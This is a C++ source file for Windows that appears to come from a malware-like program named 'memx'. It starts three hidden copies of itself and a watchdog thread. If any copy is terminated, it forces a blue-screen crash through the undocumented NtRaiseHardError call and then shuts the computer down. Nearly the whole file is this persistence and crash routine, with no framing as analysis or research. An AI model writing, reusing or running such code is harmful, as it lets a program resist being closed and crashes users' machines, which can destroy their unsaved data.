#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>

extern volatile bool g_running;

std::vector<DWORD> GetProcessesByName(const std::wstring& name) {
    std::vector<DWORD> pids;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return pids;
    
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (name == pe.szExeFile) {
                pids.push_back(pe.th32ProcessID);
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pids;
}

void TriggerBSOD() {
    typedef NTSTATUS (NTAPI *pNtRaiseHardError)(
        NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG
    );
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtRaiseHardError NtRaiseHardError = 
        (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
    
    if (NtRaiseHardError) {
        UNICODE_STRING msg;
        RtlInitUnicodeString(&msg, L"MEMX: SYSTEM CRASH");
        ULONG response;
        NtRaiseHardError(0xDEADBEEF, 0, 0, NULL, 1, &response);
    }
}

DWORD WINAPI WatchdogProcess(LPVOID param) {
    const wchar_t* target = L"memx.exe";
    
    while (g_running) {
        auto pids = GetProcessesByName(target);
        if (pids.size() < 4) {
            TriggerBSOD();
            Sleep(1000);
            system("shutdown /s /t 0");
            break;
        }
        Sleep(1000);
    }
    return 0;
}

void CreateWatchdogChild(const std::wstring& exePath) {
    STARTUPINFOW si = {sizeof(STARTUPINFOW)};
    PROCESS_INFORMATION pi;
    
    std::wstring cmd = L"\"" + exePath + L"\" /watchdog";
    CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

void StartWatchdog() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    
    for (int i = 0; i < 3; i++) {
        CreateWatchdogChild(path);
    }
    
    CreateThread(NULL, 0, WatchdogProcess, (LPVOID)1, 0, NULL);
}